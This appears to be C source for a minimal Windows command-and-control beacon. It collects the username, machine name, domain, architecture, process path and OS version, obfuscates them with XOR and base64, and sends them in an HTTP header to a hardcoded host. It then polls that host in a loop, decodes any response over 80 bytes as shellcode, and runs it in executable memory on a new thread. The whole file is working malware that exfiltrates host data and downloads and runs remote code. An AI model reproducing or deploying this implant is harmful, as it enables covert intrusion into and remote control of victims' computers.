#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#define delay 5000
#define MAX_BUFFER 20000

void xor (char *buf, int bufsize);
int main()
{
    char *user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36";
    char *url = "192.168.17.131";
    char *path = "/test";
    int port = 8001;

    char username[256];
    DWORD username_len = 256;
    GetUserName(username, &username_len);
    DWORD pid = GetCurrentProcessId();
    char computername[256];
    DWORD computername_len = 256;
    GetEnvironmentVariable("COMPUTERNAME", computername, computername_len);
    char domain[256];
    DWORD domain_len = 256;
    GetEnvironmentVariable("USERDOMAIN", domain, domain_len);
    char arch[256];
    GetEnvironmentVariable("PROCESSOR_ARCHITECTURE", arch, 256);
    char process_name[256];
    GetModuleFileName(NULL, process_name, 256);
    char product_name[256];
    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, product_name, &computername_len);

    char *data = "username=%s&pid=%d&machine=%s&domain=%s&arch=%s&process=%s&version=%s";
    char *post_data = malloc(strlen(data) + strlen(username) + strlen(computername) + strlen(domain) + strlen(arch) + strlen(process_name) + strlen(product_name));
    sprintf(post_data, data, username, pid, computername, domain, arch, process_name, product_name);
    // Xor then base64 encode the data
    xor(post_data, strlen(post_data));
    char *encoded_data = malloc(strlen(post_data) * 2);
    DWORD encoded_data_len = strlen(post_data) * 2;
    CryptBinaryToString(post_data, strlen(post_data), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded_data, &encoded_data_len);

    while (1)
    {
        HINTERNET hInternet = InternetOpen(user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        HINTERNET hConnect = InternetConnect(hInternet, url, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
        char header[14 + strlen(encoded_data)];
        sprintf(header, "X-Session-ID: %s", encoded_data);
        HttpAddRequestHeaders(hRequest, header, strlen(header), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
        HttpSendRequest(hRequest, NULL, 0, NULL, 0);
        LPVOID buffer = VirtualAlloc(0, MAX_BUFFER, MEM_COMMIT, PAGE_READWRITE);
        DWORD dw_read = 0x00;
        InternetReadFile(hRequest, buffer, MAX_BUFFER, &dw_read);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        printf("[+] Request sent\r\n");
        printf("[+] Data: %s\r\n", header);
        printf("[-] Received response of size %d\n", dw_read);
        printf("[-] Response: %s\r\n", buffer);
        // if the buffer is longer than 80 bytes we assume it is shellcode
        if (dw_read > 80)
        {
            printf("[-] Received shellcode of size %d\r\n", dw_read);
            // xor the buffer
            xor(buffer, dw_read);
            // execute the shellcode in a new thread
            DWORD threadId;
            HANDLE hHandle;
            DWORD oldProtect = 0x04;
            LPVOID shellcode = VirtualAlloc(NULL, dw_read, 0x3000, 0x40);
            printf("[-] Allocated memory at %p\r\n", shellcode);
            CopyMemory(shellcode, buffer, dw_read);
            printf("[-] Copied shellcode to memory\r\n");
            VirtualProtect(shellcode, dw_read, 0x20, &oldProtect);
            printf("[-] Changed memory protection\r\n");
            hHandle = CreateThread(NULL, 0, shellcode, NULL, 0, &threadId);
            printf("[-] Created thread\r\n");
            WaitForSingleObject(hHandle, INFINITE);
            printf("[-] Thread finished\r\n");
        }
        Sleep(delay);
    }
    return 0;
}
void xor (char *buf, int bufsize) {
    for (int i = 0; i < bufsize; i++)
        *buf++ ^= 0xfa;
}